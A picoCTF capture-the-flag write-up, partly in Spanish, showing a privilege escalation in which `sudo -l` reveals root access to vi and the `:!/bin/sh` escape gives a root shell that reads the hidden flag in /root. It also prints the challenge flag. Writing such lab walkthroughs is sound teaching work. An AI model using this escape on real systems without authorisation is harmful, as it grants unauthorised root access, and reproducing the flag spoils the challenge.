## Descripción

Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 51822 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Can you login and read the root file?

## Solución

```
NoeAH-academy@webshell:~$ ssh -p 60258 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:60258 ([13.59.203.175]:60258)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:60258' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi

[No write since last change]
```

```
[No write since last change]
# cd /root
# ls -a
.  ..  .bashrc  .flag.txt  .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}
```

## Notas adicionales

- **`sudo -l`:** Comando fundamental de enumeración para descubrir qué acciones privilegiadas están permitidas.
- **`:!/bin/sh`:** La instrucción exacta de escape dentro de `vi` para generar (_spawn_) la consola de comandos con privilegios heredados.
## Referencias